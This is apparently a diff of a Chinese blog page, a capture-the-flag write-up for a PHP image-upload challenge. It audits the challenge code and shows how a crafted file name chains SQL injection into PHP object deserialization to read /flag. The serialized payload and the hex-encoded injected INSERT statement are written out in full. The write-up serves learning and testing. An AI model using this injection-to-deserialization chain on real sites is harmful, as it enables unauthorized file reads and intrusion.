-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file = <span class="keyword">new</span> upload();</span><br><span class="line">		$file-&gt;upload_base();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>show.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line">	<span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">		$show-&gt;Delete_All_Images();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $con;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   			<span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">		<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">		    	<span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">		    		$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">					$attr = unserialize($attr_temp);</span><br><span class="line">				&#125;</span><br><span class="line">		        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">		$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>helper.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line">	<span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">		$array = <span class="keyword">array</span>();</span><br><span class="line">		$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">		$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">		$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">		$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">		$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">		$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">		$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">		<span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">			$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $rs;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">		$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">		$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">		$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">		$sql_val = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">			$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">			$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">			$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		<span class="keyword">return</span> $id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			<span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+include(&quot;./helper.php&quot;);
+class upload extends helper {
+    public function upload_base(){
+        $this-&gt;upload();
+    }
+}
 
+if ($_FILES){
+    if ($_FILES[&quot;file&quot;][&quot;error&quot;]){
+        die(&quot;Upload file failed.&quot;);
+    }else{
+        $file = new upload();
+        $file-&gt;upload_base();
+    }
+}
+
+$a = new helper();
+?&gt;</code></pre>
+<p>show.php</p>
+<pre><code class="php">&lt;?php
+include(&quot;./helper.php&quot;);
+$show = new show();
+if($_GET[&quot;delete_all&quot;]){
+    if($_GET[&quot;delete_all&quot;] == &quot;true&quot;){
+        $show-&gt;Delete_All_Images();
+    }
+}
+$show-&gt;Get_All_Images();
+
+class show{
+    public $con;
+
+    public function __construct(){
+        $this-&gt;con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);
+        if (mysqli_connect_errno($this-&gt;con)){ 
+               die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());
+        }
+    }
+
+    public function Get_All_Images(){
+        $sql = &quot;SELECT * FROM images&quot;;
+        $result = mysqli_query($this-&gt;con, $sql);
+        if ($result-&gt;num_rows &gt; 0){
+            while($row = $result-&gt;fetch_assoc()){
+                if($row[&quot;attr&quot;]){
+                    $attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);
+                    $attr = unserialize($attr_temp);
+                }
+                echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;
+            }
+        }else{
+            echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;
+        }
+        mysqli_close($this-&gt;con);
+    }
+
+    public function Delete_All_Images(){
+        $sql = &quot;DELETE FROM images&quot;;
+        $result = mysqli_query($this-&gt;con, $sql);
+    }
+}
+?&gt;</code></pre>
+<p>helper.php</p>
+<pre><code class="php">&lt;?php
+class helper {
+    protected $folder = &quot;pic/&quot;;
+    protected $ifview = False; 
+    protected $config = &quot;config.txt&quot;;
+    // The function is not yet perfect, it is not open yet.
+
+    public function upload($input=&quot;file&quot;)
+    {
+        $fileinfo = $this-&gt;getfile($input);
+        $array = array();
+        $array[&quot;title&quot;] = $fileinfo[&#39;title&#39;];
+        $array[&quot;filename&quot;] = $fileinfo[&#39;filename&#39;];
+        $array[&quot;ext&quot;] = $fileinfo[&#39;ext&#39;];
+        $array[&quot;path&quot;] = $fileinfo[&#39;path&#39;];
+        $img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);
+        $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);
+        $array[&quot;attr&quot;] = serialize($my_ext);
+        $id = $this-&gt;save($array);
+        if ($id == 0){
+            die(&quot;Something wrong!&quot;);
+        }
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;/p&gt;&quot;;
+    }
+
+    public function getfile($input)
+    {
+        if(isset($input)){
+            $rs = $this-&gt;check($_FILES[$input]);
+        }
+        return $rs;
+    }
+
+    public function check($info)
+    {
+        $basename = substr(md5(time().uniqid()),9,16);
+        $filename = $info[&quot;name&quot;];
+        $ext = substr(strrchr($filename, &#39;.&#39;), 1);
+        $cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);
+        if(!in_array($ext,$cate_exts)){
+            die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);
+        }
+        $title = str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename);
+        return array(&#39;title&#39;=&gt;$title,&#39;filename&#39;=&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;=&gt;$ext,&#39;path&#39;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);
+    }
+
+    public function save($data)
+    {
+        if(!$data || !is_array($data)){
+            die(&quot;Something wrong!&quot;);
+        }
+        $id = $this-&gt;insert_array($data);
+        return $id;
+    }
+
+    public function insert_array($data)
+    {    
+        $con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);
+        if (mysqli_connect_errno($con)) 
+        { 
+            die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());
+        }
+        $sql_fields = array();
+        $sql_val = array();
+        foreach($data as $key=&gt;$value){
+            $key_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $key);
+            $value_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value);
+            $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;
+            $sql_val[] = &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;;
+        }
+        $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;
+        mysqli_query($con, $sql);
+        $id = mysqli_insert_id($con);
+        mysqli_close($con);
+        return $id;
+    }
+
+    public function view_files($path){
+        if ($this-&gt;ifview == False){
+            return False;
+            //The function is not yet perfect, it is not open yet.
+        }
+        $content = file_get_contents($path);
+        echo $content;
+    }
+
+    function __destruct(){
+        # Read some config html
+        $this-&gt;view_files($this-&gt;config);
+    }
+}
+?&gt;</code></pre>
 <p>先从比较直观的地方开始审计。我个人首先从helper.php开始观察。因为这很有可能存在是一个反序列化利用的代码。果然首先注意到，helper类中，有着经典的<code>_destruct()</code>魔术方法，它调用的<code>view_file()</code>方法，会执行<code>file_get_contents()</code>函数。显然是利用它。回过头再仔细看下触发方式。<br>首先，在helper.php中，发现图片的<code>attr属性</code>被序列化存储。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;attr&quot;] &#x3D; serialize($my_ext);</span><br></pre></td></tr></table></figure>
-<p>之后在show.php中，调用了一次反序列化</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>$array[&quot;attr&quot;] = serialize($my_ext);</code></pre><p>之后在show.php中，调用了一次反序列化</p>
+<pre><code class="php">if($row[&quot;attr&quot;]){
+$attr_temp = str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);
+$attr = unserialize($attr_temp);
+}</code></pre>
 <p>然后注意我们的upload图片操作，传图片后，调用了<code>check()</code>函数，但是并没有对文件名做检测就被保存为info，之后作为参数传进了<code>save()</code>函数。<code>save()</code>本质上执行了一次sql语句：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code></pre>
 <p>也就是说，我们其实是通过控制上传图片的文件名，触发sql注入，进一步触发反序列化，达到目的。<br>所以现生成反序列化payoad:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class helper
+{
+    protected $ifview = True;
+    protected $config = &quot;/flag&quot;;
+}
+$a=new helper();
+echo(serialize($a));</code></pre>
 <p>得到结果需要调整为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"helper"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"\0\0\0ifview"</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"\0\0\0config"</span>;s:<span class="number">5</span>:<span class="string">"/flag"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">O:6:&quot;helper&quot;:2:{s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;}</code></pre>
 <p>这是由于protected的属性决定的。如果是private则是两个<code>%00%00</code>。<br>然后构造文件名，我们只需让文件的序列化部分改为我们的payload。基于普通上传执行语句为：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1.jpg'</span>,<span class="string">'jpg'</span>,<span class="string">'pic/f20c76cc4fb41838.jpg'</span>,<span class="string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="php">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;1&#39;,&#39;1.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:{s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;}&#39;)</code></pre>
 <p>我们把文件名改改</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">'1.jpg'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="php">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg&#39;)</code></pre>
 <p>其中的由于引号问题，我们的payload需要字符串转16进制。<br>上传文件即可触发得到flag.<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 
   
@@ -736,7 +988,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -748,9 +1000,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -883,6 +1135,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1096,7 +1350,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
